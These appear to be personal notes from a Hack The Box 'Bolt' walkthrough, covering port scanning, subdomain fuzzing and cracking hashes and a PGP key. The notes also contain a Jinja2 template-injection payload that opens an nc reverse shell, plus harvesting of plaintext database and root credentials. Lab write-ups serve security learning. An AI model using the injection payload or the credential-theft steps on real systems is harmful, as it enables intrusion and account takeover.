# scanning
TARGET=10.10.11.114 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

## 22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

## 80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
|_http-title:     Starter Website -  About 
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)

## 443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048

10.10.11.114    bolt.htb
> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://bolt.htb/" -H "Host: FUZZ.bolt.htb" --hl 107

ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000002:   200        98 L     322 W      4943 Ch     "mail"
000000038:   302        3 L      24 W       219 Ch      "demo" 
passbolt.bolt.htb


support@bolt.htb
sales@bolt.htb

* download image.tar and locate a db.sqlite file
admin
admin@bolt.htb
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:`deadbolt`

* portal is adminlte 3, nope
https://github.com/pr0tean/CVE-2019-13051

* continue exploring the downloaded info
* 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer/app/base/routes.py
```python
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
```

* can register an account

* change the profile, name field can be template injected

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 4444 >/tmp/f')|attr('read')()}}

# pe
```python
www-data@bolt:~/demo$ cat config.py
cat config.py
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```

> find / -type f -group www-data 2>/dev/null

* /etc/passbolt/passbolt.php
'username' => 'passbolt',
'password' => 'rT2;jW7<eY8!dX8}pQ8%',
'database' => 'passboltdb',

> mysql -u passbolt -p
> select * from users;
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| id                                   | role_id                              | username       | active | deleted | created             | modified            |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 975b9a56-b1b1-453c-9362-c238a85dad76 | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |
| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+

select * from users;

-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----


# user 1
`eddie:rT2;jW7<eY8!dX8}pQ8%`

eddie@bolt:~$ cat user.txt
cat user.txt


www-data@bolt:~/roundcube/config$ cat config.inc.php
```
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
$config['des_key'] = 'tdqy62YPNdGEeohXtJ2160bX';
```

* in eddie's home folder
> grep -iR "BEGIN PGP"

```
just go to eddie home folder!

and do grep -iR "BEGIN PGP"

you will find some files and inside of one of them there is pgp private key!

grab it and crack the password with john!!

then go to passbolt domain and use the email on the passboltdb database and you will be provided with check your mail page!

You can bypass it! if you google how to recover an account in a network without email!!
```

eddie@bolt:~/.gnupg/private-keys-v1.d$ cat /home/eddie/.gnupg/openpgp-revocs.d/eddie.key
cat: /home/eddie/.gnupg/openpgp-revocs.d/eddie.key: No such file or directory
eddie@bolt:~/.gnupg/private-keys-v1.d$

* locate private gpg key
> less ".config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"

# cracking the gpg private key
> gpg2john pgp_private.key > gpg.john
> john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg gpg.john

`merrychristmas`

Invite_Code => XNSS-HSJW-3NGU-8XTJ
Admin_Page => admin:deadbolt
Database_Creds => passbolt:rT2;jW7<eY8!dX8}pQ8%
SSH_Creds => eddie:rT2;jW7<eY8!dX8}pQ8%
Passpharse_Of_Private_Key => merrychristmas  (Eddie Johnson)
Creds_Root => root:Z(2rmxsNW(Z?3=p/9s


> root@kali:~/workspace/htb-Bolt# gpg --import pgp_private.key 
gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson <eddie@bolt.htb>" imported
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

> root@kali:~/workspace/htb-Bolt# gpg --output doc --decrypt message.gpg 
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
gpg: Signature made Sun 07 Mar 2021 04:33:54 AM NZDT
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD

> root@kali:~/workspace/htb-Bolt# ls
doc  gpg.john  image  message.gpg  nmap_tcp_all.nmap  pgp_private.key  subdomains.txt

> root@kali:~/workspace/htb-Bolt# cat doc
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}


# pe
eddie@bolt:~$ su
Password: 
root@bolt:/home/eddie# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@bolt:/home/eddie# cd
root@bolt:~# ls
root.txt  snap
root@bolt:~# cat root.txt


# ref
https://deceit.dev/hack-the-box-bolt-medium-walkthrough
